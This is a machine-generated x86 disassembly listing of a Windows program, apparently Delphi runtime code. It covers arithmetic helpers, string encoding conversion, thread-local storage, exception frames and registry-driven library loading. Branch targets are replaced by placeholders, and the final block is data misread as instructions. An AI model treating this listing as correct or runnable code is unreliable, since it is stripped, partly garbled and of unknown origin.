dec ebp
jne r-xdata
cmp cl 0xb
je r-xdata
jmp r-xdata
mov eax ebx
mov edx [ esi ]
call sub_4046c4
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
cmp cl 0xc
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn 0x4
jmp r-xdata
mov eax ebx
mov edx esi
call sub_404b28
add ebx 0x10
add esi 0x10
dec ebp
jne r-xdata
cmp cl 0xd
je r-xdata
jmp r-xdata
xor ecx ecx
mov cl [ edi + 0x1 ]
lea edi [ ecx + edi + 0x2 ]
cmp cl 0xe
je r-xdata
mov eax ebx
mov edx esi
mov ecx [ edi + 0x8 ]
push [ edi + 0x4 ]
call sub_404c5c
add ebx [ edi ]
add esi [ edi ]
dec ebp
jne r-xdata
jmp r-xdata
mov eax ebx
mov edx esi
mov ecx edi
call sub_404b40
xor eax eax
mov al [ edi + 0x1 ]
add ebx [ eax + edi + 0x2 ]
add esi [ eax + edi + 0x2 ]
dec ebp
jne r-xdata
cmp cl 0xf
je r-xdata
jmp r-xdata
mov eax ebx
mov edx [ esi ]
call sub_4056dc
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
cmp cl 0x11
je r-xdata
jmp r-xdata
mov eax ebx
mov edx [ esi ]
mov ecx edi
call sub_405020
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
mov al 0x2
pop ebp
pop edi
pop esi
pop ebx
jmp sub_402818
sub_404d7c
push edx
push eax
mov eax [ esp + 0x10 ]
mul [ esp ]
mov ecx eax
mov eax [ esp + 0x4 ]
mul [ esp + 0xc ]
add ecx eax
mov eax [ esp ]
mul [ esp + 0xc ]
add edx ecx
pop ecx
pop ecx
retn 0x8
sub_404da0
push ebp
push ebx
push esi
push edi
xor edi edi
mov ebx [ esp + 0x14 ]
mov ecx [ esp + 0x18 ]
or ecx ecx
jne r-xdata
or edx edx
jns r-xdata
or edx edx
je r-xdata
or ecx ecx
jns r-xdata
neg edx
neg eax
sbb edx 0x0
or edi 0x1
div ebx
xchg edx eax
xor edx edx
jmp r-xdata
or ebx ebx
je r-xdata
mov ebp ecx
mov ecx 0x40
push edi
xor edi edi
xor esi esi
neg ecx
neg ebx
sbb ecx 0x0
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
loop r-xdata
ja r-xdata
shl eax 0x1
rcl edx 0x1
rcl esi 0x1
rcl edi 0x1
cmp edi ebp
jb r-xdata
mov eax esi
mov edx edi
pop ebx
test ebx 0x1
je r-xdata
sub esi ebx
sbb edi ebp
inc eax
cmp esi ebx
jb r-xdata
neg edx
neg eax
sbb edx 0x0
sub_404e4c
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp - 0x4 ]
mov ebx [ ebx ]
mov eax [ ebp + 0x8 ]
mov edi [ eax ]
test edi edi
jg r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
test ebx ebx
je r-xdata
test edi edi
jge r-xdata
xor eax eax
mov al [ esi + 0x1 ]
add esi eax
mov eax esi
mov edx [ eax + 0x2 ]
mov [ ebp - 0x18 ] edx
mov edx [ eax + 0x6 ]
test edx edx
je r-xdata
sub ebx 0x4
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
sub ebx 0x4
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_404e44
jmp r-xdata
mov al 0x4
call sub_402818
xor esi esi
mov esi [ edx ]
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
add [ ebp - 0x1c ] 0x8
test ebx ebx
je r-xdata
mov al 0x4
call sub_402818
mov eax edi
imul [ ebp - 0x18 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x1c ]
cdq
idiv edi
cmp eax [ ebp - 0x18 ]
je r-xdata
mov [ ebp - 0x20 ] ebx
cmp edi [ ebp - 0x10 ]
jge r-xdata
cmp [ ebx ] 0x1
jne r-xdata
lea eax [ ebp - 0x20 ]
mov edx [ ebp - 0x1c ]
call sub_4026fc
mov ebx [ ebp - 0x20 ]
jmp r-xdata
test esi esi
je r-xdata
dec [ ebx ]
mov eax [ ebp - 0x1c ]
call sub_4026bc
mov ebx eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x14 ] eax
cmp edi [ ebp - 0x14 ]
jge r-xdata
mov [ ebx ] 0x1
add ebx 0x4
mov [ ebx ] edi
add ebx 0x4
mov edx edi
sub edx [ ebp - 0x10 ]
imul edx [ ebp - 0x18 ]
mov eax [ ebp - 0x18 ]
imul eax [ ebp - 0x10 ]
add eax ebx
xor ecx ecx
call sub_402c64
cmp [ ebp - 0x8 ] 0x1
jle r-xdata
mov eax ebx
add eax 0x8
mov edx edi
imul edx [ ebp - 0x18 ]
add eax edx
mov ecx [ ebp - 0x10 ]
sub ecx edi
mov edx esi
call j_sub_404a30
test esi esi
je r-xdata
mov [ ebp - 0x14 ] edi
mov eax [ ebp - 0x4 ]
mov [ eax ] ebx
add [ ebp + 0x8 ] 0x4
dec [ ebp - 0x8 ]
dec edi
test edi edi
jl r-xdata
mov ecx [ ebp - 0x14 ]
imul ecx [ ebp - 0x18 ]
mov edx ebx
add edx 0x8
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_4028b8
mov edx [ ebp - 0x14 ]
imul edx [ ebp - 0x18 ]
mov eax ebx
add eax 0x8
xor ecx ecx
call sub_402c64
mov eax [ ebp - 0x14 ]
push eax
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
mov eax ebx
add eax 0x8
mov ecx esi
call sub_404e2c
jmp r-xdata
inc edi
mov [ ebp - 0xc ] 0x0
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0xc ]
lea eax [ ebx + eax * 4 ]
mov ecx [ ebp - 0x8 ]
mov edx esi
call sub_404e4c
inc [ ebp - 0xc ]
dec edi
jne r-xdata
sub_404fe4
mov ecx [ eax ]
test ecx ecx
je r-xdata
retn
mov [ eax ] 0x0
[ ecx - 0x8 ]
jne r-xdata
push eax
mov eax ecx
xor ecx ecx
mov cl [ edx + 0x1 ]
mov edx [ ecx + edx + 0x6 ]
test edx edx
je r-xdata
sub eax 0x8
call sub_4026dc
pop eax
mov ecx [ eax - 0x4 ]
test ecx ecx
je r-xdata
mov edx [ edx ]
call sub_404a30
sub_405020
push ebx
mov ebx [ eax ]
test edx edx
je r-xdata
test ebx ebx
je r-xdata
[ edx - 0x8 ]
mov [ eax ] edx
pop ebx
retn
[ ebx - 0x8 ]
jne r-xdata
push eax
push edx
mov edx ecx
inc [ ebx - 0x8 ]
call sub_404fe4
pop edx
pop eax
sub_405048
add esp 0xffffffe4
push 0x1c
lea edx [ esp + 0x4 ]
push edx
push eax
call sub_4012cc
cmp [ esp + 0x10 ] 0x1000
jne r-xdata
xor eax eax
mov eax [ esp + 0x4 ]
jmp r-xdata
add esp 0x1c
retn
sub_405078
push ebx
push esi
add esp 0xfffffef8
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
mov eax [ ebx + 0x10 ]
add esp 0x108
pop esi
pop ebx
retn
push 0x105
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call sub_40125c
mov eax esp
mov dl 0x1
call sub_4052b4
mov esi eax
mov [ ebx + 0x10 ] esi
test esi esi
jne r-xdata
mov eax [ ebx + 0x4 ]
mov [ ebx + 0x10 ] eax
sub_4050c0
mov edx [ rw-data ]
test edx edx
je r-xdata
retn
cmp eax [ edx + 0x4 ]
je r-xdata
mov eax edx
call sub_405078
retn
cmp eax [ edx + 0x8 ]
je r-xdata
cmp eax [ edx + 0xc ]
jne r-xdata
mov edx [ edx ]
test edx edx
jne r-xdata
sub_4050fc
push ebp
mov ebp esp
add esp 0xfffffdb0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
push r-xdata
call sub_401264
mov esi eax
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x5c
jne r-xdata
push r-xdata
push esi
call sub_40126c
mov ebx eax
test ebx ebx
je r-xdata
mov esi [ ebp - 0x4 ]
add esi 0x2
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1 ] 0x5c
jne r-xdata
push 0x105
lea eax [ ebp - 0x24f ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call ebx
test eax eax
je r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
add eax 0x2
call sub_4050e8
mov esi eax
cmp [ esi ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x24f ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call lstrcpynA
jmp r-xdata
lea eax [ esi + 0x1 ]
call sub_4050e8
mov edi eax
mov eax edi
sub eax esi
mov edx eax
add edx ebx
inc edx
cmp edx 0x105
jg r-xdata
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x24f ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call lstrcpynA
lea eax [ esi + 0x1 ]
call sub_4050e8
mov esi eax
cmp [ esi ] 0x0
je r-xdata
inc eax
push eax
push esi
lea eax [ ebp - 0x24f ]
add eax ebx
push eax
call lstrcpynA
lea eax [ ebp - 0x14a ]
push eax
lea eax [ ebp - 0x24f ]
push eax
call sub_40123c
mov esi eax
cmp esi 0xffffffff
je r-xdata
jmp r-xdata
push esi
call sub_401234
lea eax [ ebp - 0x11e ]
push eax
call lstrlenA
lea edx [ ebx + 0x1 ]
add eax edx
inc eax
cmp eax 0x105
jg r-xdata
mov ebx esi
sub ebx [ ebp - 0x4 ]
lea eax [ ebx + 0x1 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x24f ]
push eax
call lstrcpynA
jmp r-xdata
mov [ ebp + ebx - 0x24f ] 0x5c
mov eax 0x105
sub eax ebx
dec eax
push eax
lea eax [ ebp - 0x11e ]
push eax
lea eax [ ebp - 0x24f ]
add eax ebx
inc eax
push eax
call lstrcpynA
lea eax [ ebp - 0x11e ]
push eax
call lstrlenA
inc eax
add ebx eax
mov esi edi
sub_4052b4
push ebp
mov ebp esp
add esp 0xfffffee0
push ebx
push esi
mov [ ebp - 0x4 ] eax
push 0x105
lea eax [ ebp - 0x11d ]
push eax
push 0x0
call sub_40125c
mov [ ebp - 0x12 ] 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0xf0019
push 0x0
push r-xdata
push 0x80000001
call sub_4012b4
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_4053b9
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x18 ] 0x5
lea eax [ ebp - 0x11d ]
mov edx 0x105
call sub_4050fc
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x12 ]
push eax
push 0x0
push 0x0
lea eax [ ebp - 0x11d ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call sub_4012bc
test eax eax
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
push 0xf0019
push 0x0
push r-xdata
push 0x80000002
call sub_4012b4
test eax eax
je r-xdata
mov [ ebp - 0xe ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
call sub_4012ac
retn
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x12 ]
push eax
push 0x0
push 0x0
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
call sub_4012bc
test eax eax
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
push 0xf0019
push 0x0
push r-xdata
push 0x80000001
call sub_4012b4
test eax eax
jne r-xdata
mov [ ebp - 0x12 ] 0x0
push 0x105
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x11d ]
push eax
call lstrcpynA
push 0x5
lea eax [ ebp - 0xd ]
push eax
push 0x3
call sub_40127c
push eax
call sub_401254
xor esi esi
cmp [ ebp - 0x11d ] 0x0
je r-xdata
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebp - 0xd ] 0x0
jne r-xdata
lea eax [ ebp - 0x11d ]
push eax
call lstrlenA
mov ebx eax
lea eax [ ebp - 0x11d ]
add ebx eax
jmp r-xdata
cmp [ ebp - 0x12 ] 0x0
je r-xdata
cmp [ ebx ] 0x2e
je r-xdata
lea eax [ ebp - 0x11d ]
cmp ebx eax
je r-xdata
lea eax [ ebp - 0x11d ]
cmp ebx eax
jne r-xdata
inc ebx
cmp [ ebp - 0x12 ] 0x0
je r-xdata
dec ebx
test esi esi
jne r-xdata
mov edx ebx
sub edx eax
mov eax 0x105
sub eax edx
push eax
lea eax [ ebp - 0x12 ]
push eax
push ebx
call lstrcpynA
push 0x2
push 0x0
lea eax [ ebp - 0x11d ]
push eax
call LoadLibraryExA
mov esi eax
cmp [ ebp - 0xd ] 0x0
je r-xdata
lea eax [ ebp - 0x11d ]
mov edx ebx
sub edx eax
mov eax 0x105
sub eax edx
push eax
lea eax [ ebp - 0xd ]
push eax
push ebx
call lstrcpynA
push 0x2
push 0x0
lea eax [ ebp - 0x11d ]
push eax
call LoadLibraryExA
mov esi eax
test esi esi
jne r-xdata
mov [ ebp - 0xb ] 0x0
lea eax [ ebp - 0x11d ]
mov edx ebx
sub edx eax
mov eax 0x105
sub eax edx
push eax
lea eax [ ebp - 0xd ]
push eax
push ebx
call lstrcpynA
push 0x2
push 0x0
lea eax [ ebp - 0x11d ]
push eax
call LoadLibraryExA
mov esi eax
sub_40552c
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov ebx [ rw-data ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_405078
mov edx edi
call esi
test al al
je r-xdata
mov ebx [ ebx ]
test ebx ebx
jne r-xdata
sub_405588
push ebx
push esi
mov esi [ rw-data ]
test esi esi
je r-xdata
mov edx esi
test edx edx
je r-xdata
mov edx [ esi + 0x4 ]
cmp edx eax
jne r-xdata
pop esi
pop ebx
retn
mov ecx [ edx ]
test ecx ecx
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov [ rw-data ] eax
mov edx 0x8
mov eax esi
call sub_4026dc
pop esi
pop ebx
retn
mov edx [ edx ]
test edx edx
jne r-xdata
mov ebx [ ecx + 0x4 ]
cmp ebx eax
jne r-xdata
mov esi ecx
mov eax [ ecx ]
mov [ edx ] eax
mov edx 0x8
mov eax esi
call sub_4026dc
jmp r-xdata
sub_4055e8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
xor eax eax
push ebp
push sub_405623
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call [ ebx + 0x4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
sub_405654
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_4056b8
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_4055e8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4056bf
mov eax [ ebp - 0x4 ]
cmp eax [ rw-data ]
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov [ rw-data ] eax
jmp r-xdata
retn
mov edx [ eax ]
cmp edx [ ebp - 0x4 ]
jne r-xdata
mov eax [ eax ]
test eax eax
jne r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
mov [ eax ] edx
jmp r-xdata
sub_4056dc
test edx edx
je r-xdata
mov ecx [ eax ]
test ecx ecx
mov [ eax ] edx
je r-xdata
push edx
push eax
mov eax [ edx ]
push edx
call [ eax + 0x4 ]
pop eax
mov ecx [ eax ]
pop [ eax ]
test ecx ecx
jne r-xdata
retn
mov eax [ ecx ]
push ecx
call [ eax + 0x8 ]
mov eax [ ecx ]
push ecx
call [ eax + 0x8 ]
retn
retn
sub_405708
test edx edx
je sub_4056c4
push edi
mov edi eax
push 0x0
push esp
push ecx
push edx
mov eax [ edx ]
call [ eax ]
test eax eax
je r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
mov al 0x17
jmp sub_402818
pop eax
mov [ edi ] eax
pop edi
retn
push eax
mov eax [ eax ]
call [ eax + 0x8 ]
sub_4057ac
push ebp
mov ebp esp
push ebx
push esi
mov ebx [ ebp + 0x8 ]
lea eax [ ebx + 0x4 ]
push eax
call InterlockedDecrement
mov esi eax
test esi esi
jne r-xdata
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x4 ]
sub_4057d4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
xor edx edx
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax edx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
xor esi esi
xor ecx ecx
test eax eax
je r-xdata
cmp ecx [ ebp + 0x8 ]
jae r-xdata
jmp r-xdata
lea edx [ esi + 0x1 ]
mov eax [ ebp - 0x8 ]
movzx edx [ eax + ecx * 2 ]
inc ecx
cmp edx 0x7f
jbe r-xdata
cmp ecx [ ebp + 0x8 ]
jae r-xdata
inc esi
cmp ecx [ ebp + 0x8 ]
jb r-xdata
cmp edx 0x7ff
jbe r-xdata
cmp esi [ ebp - 0x4 ]
jb r-xdata
cmp esi [ ebp - 0x4 ]
jb r-xdata
inc esi
inc esi
mov [ eax + esi ] 0x0
jmp r-xdata
mov esi [ ebp - 0x4 ]
dec esi
mov edx [ ebp - 0x8 ]
movzx edx [ edx + ecx * 2 ]
inc ecx
cmp edx 0x7f
ja r-xdata
cmp edx 0x7ff
jbe r-xdata
mov [ eax + esi ] dl
inc esi
jmp r-xdata
lea ebx [ esi + 0x2 ]
cmp ebx [ ebp - 0x4 ]
ja r-xdata
lea ebx [ esi + 0x3 ]
cmp ebx [ ebp - 0x4 ]
ja r-xdata
mov ebx edx
shr ebx 0x6
or bl 0xc0
mov [ eax + esi ] bl
and dl 0x3f
or dl 0x80
mov [ eax + esi + 0x1 ] dl
add esi 0x2
mov ebx edx
shr ebx 0xc
or bl 0xe0
mov [ eax + esi ] bl
mov ebx edx
shr ebx 0x6
and bl 0x3f
or bl 0x80
mov [ eax + esi + 0x1 ] bl
and dl 0x3f
or dl 0x80
mov [ eax + esi + 0x2 ] dl
add esi 0x3
jmp r-xdata
sub_4058b0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov [ ebp - 0x10 ] 0xffffffff
xor eax eax
xor esi esi
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
jmp r-xdata
mov eax [ ebp - 0x10 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
inc eax
mov [ ebp - 0x10 ] eax
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
test dl 0x80
je r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
inc eax
cmp esi [ ebp + 0x8 ]
jb r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
cmp eax [ ebp - 0x8 ]
jb r-xdata
cmp eax [ ebp - 0x8 ]
jb r-xdata
and dl 0x3f
test dl 0x20
je r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + eax * 2 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x8 ]
dec eax
mov edx [ ebp - 0xc ]
xor ecx ecx
mov cl [ edx + esi ]
inc esi
test cl 0x80
je r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
and dl 0xc0
cmp dl 0x80
jne r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
and dl 0xc0
cmp dl 0x80
jne r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + eax * 2 ] cx
cmp esi [ ebp + 0x8 ]
jae r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
and ecx 0x3f
test cl 0x20
je r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
mov ebx edx
and bl 0xc0
cmp bl 0x80
jne r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
mov ebx edx
and bl 0xc0
cmp bl 0x80
jne r-xdata
and dl 0x3f
and edx 0xff
shl ecx 0x6
or dx cx
mov ecx [ ebp - 0x4 ]
mov [ ecx + eax * 2 ] dx
jmp r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
inc eax
and dl 0x3f
and edx 0xff
shl ecx 0x6
or edx ecx
mov ecx edx
sub_4059e8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_405a87
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_403fa8
mov eax ebx
xor edx edx
call sub_404800
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405a8e
lea eax [ ebp - 0x4 ]
call sub_403fa8
retn
mov eax ebx
call sub_4047f4
lea edx [ eax + eax * 2 ]
lea eax [ ebp - 0x4 ]
call sub_4045f4
mov eax ebx
call sub_4047f4
push eax
mov eax [ ebp - 0x4 ]
call sub_404268
inc eax
push eax
mov eax ebx
call sub_4047e4
push eax
mov eax [ ebp - 0x4 ]
call sub_404468
pop ecx
pop edx
call sub_4057d4
test eax eax
jle r-xdata
lea eax [ ebp - 0x4 ]
call sub_403fa8
mov edx eax
dec edx
lea eax [ ebp - 0x4 ]
call sub_4045f4
jmp r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_403ffc
sub_405a94
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_405b2b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_404688
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405b32
lea eax [ ebp - 0x4 ]
call sub_404688
retn
mov eax ebx
call sub_404268
mov edx eax
lea eax [ ebp - 0x4 ]
call sub_4048d0
mov eax ebx
call sub_404268
push eax
mov eax [ ebp - 0x4 ]
call sub_4047f4
inc eax
push eax
mov eax ebx
call sub_404468
push eax
mov eax [ ebp - 0x4 ]
call sub_4047e4
pop ecx
pop edx
call sub_4058b0
test eax eax
jle r-xdata
lea eax [ ebp - 0x4 ]
call sub_404688
mov edx eax
dec edx
lea eax [ ebp - 0x4 ]
call sub_4048d0
jmp r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_4046c4
sub_405b38
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_405b7b
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_4047d4
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_4059e8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405b82
lea eax [ ebp - 0x4 ]
call sub_404688
retn
sub_405b88
push ebx
push esi
add esp 0xfffffc00
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
add esp 0x400
pop esi
pop ebx
retn
cmp [ ebx + 0x4 ] 0x10000
jge r-xdata
mov eax esi
mov edx [ ebx + 0x4 ]
call sub_4041a0
push 0x400
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx ]
mov eax [ eax ]
call sub_4050c0
push eax
call sub_40128c
mov ecx eax
mov edx esp
mov eax esi
call sub_404098
jmp r-xdata
sub_405be0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor edx edx
mov [ ebp - 0x10 ] edx
xor edx edx
push ebp
push sub_405c46
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x7
lea edx [ ebp - 0xb ]
push edx
push 0x1004
push eax
call sub_401254
lea eax [ ebp - 0x10 ]
lea edx [ ebp - 0xb ]
mov ecx 0x7
call sub_404218
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0x4 ]
call sub_402c84
mov ebx eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405c4d
lea eax [ ebp - 0x10 ]
call sub_403fa8
retn
xor ebx ebx
sub_405c54
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_405c9e
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405ca5
retn
mov eax rw-data
call sub_402afc
mov eax rw-data
call sub_402afc
mov eax rw-data
call sub_402afc
call sub_401ac0
sub_405ca8
sub [ rw-data ] 0x1
jae r-xdata
retn
mov [ rw-data ] 0x2
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] 0x2
mov [ rw-data ] sub_404d74
call sub_403090
test al al
je r-xdata
call sub_403184
mov [ rw-data ] 0xd7b0
mov [ rw-data ] 0xd7b0
mov [ rw-data ] 0xd7b0
call GetCommandLineA
mov [ rw-data ] eax
call sub_40130c
mov [ rw-data ] eax
call sub_401304
and eax 0x80000000
cmp eax 0x80000000
je r-xdata
call sub_4030c0
call sub_40127c
call sub_405be0
mov [ rw-data ] eax
call sub_401304
and eax 0xff
cmp ax 0x4
jbe r-xdata
call sub_40127c
call sub_405be0
mov [ rw-data ] eax
jmp r-xdata
mov [ rw-data ] 0x3
jmp r-xdata
call sub_4012fc
mov [ rw-data ] eax
sub_405db0
push ebx
call sub_405da8
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
retn
cmp [ rw-data ] 0xffffffff
jne r-xdata
mov eax ebx
call sub_405d9c
test eax eax
jne r-xdata
mov eax 0xe2
call sub_403f9c
push eax
mov eax [ rw-data ]
push eax
call TlsSetValue
mov eax 0xe2
call sub_403f9c
sub_405df4
mov cl [ rw-data ]
mov eax [ rw-data ]
test cl cl
jne r-xdata
push eax
call TlsGetValue
test eax eax
je r-xdata
mov edx [ fs : 0x2c ]
mov eax [ edx + eax * 4 ]
retn
call sub_405db0
mov eax [ rw-data ]
push eax
call TlsGetValue
test eax eax
je r-xdata
retn
mov eax [ rw-data ]
retn
retn
sub_405e40
push ebx
mov ebx eax
xor eax eax
mov [ rw-data ] eax
push 0x0
call sub_405d7c
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
call sub_405e34
mov edx rw-data
mov eax ebx
call sub_403cf0
pop ebx
retn
sub_405e84
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_405ea9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405eb0
retn
sub_405ee0
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov [ ebx ] eax
mov [ ebx + 0x4 ] edx
add ecx eax
mov [ ebx + 0x8 ] ecx
add edx [ ebp + 0xc ]
mov [ ebx + 0xc ] edx
pop ebx
pop ebp
retn 0x8
sub_405efc
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_405f21
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405f28
retn
sub_405f34
cmp [ edi + 0x40 ] bl
add [ ebx ] al
add ch [ esi ]
xor [ 0x0 ] eax
or al 0x0
add [ eax ] al
xor al 0x5f
inc eax
add [ edx ] cl
outsd
push ebx
insb
arpl [ gs : ebp + 0x64 ] si
or [ edi + 0x64 ] ch
inc edi
jb r-xdata
jb r-xdata
jns r-xdata
add [ edi ] 0xffffff8b
sar bh 0x25
adc al 0x83
inc edi
add [ ebx + 0x1025ffc0 ] cl
add [ edi ] 0xffffff8b
sar bh 0x25
or al 0x83
inc edi
add [ ebx + 0x825ffc0 ] cl
add [ edi ] 0xffffff8b
sar bh 0x25
add al 0x83
inc edi
add [ ebx + 0x25ffc0 ] cl
add [ edi ] 0xffffff8b
sar bh 0x25
cld
add [ edi ] 0x8b
sar bh 0x25
clc
add [ edi ] 0x8b
sar bh 0x25
hlt
xor [ fs : ebx ] ecx
outsd
push edx
jae r-xdata
or ch [ fs : edi + 0x64 ]
inc esp
imul esi [ ebx + 0x61 ] 0x64656c62
or [ edi + 0x64 ] ebp
inc ebx
push 0x656b6365
or [ fs : edi + 0x64 ] ebp
inc esi
outsd
arpl [ ebp + 0x73 ] si
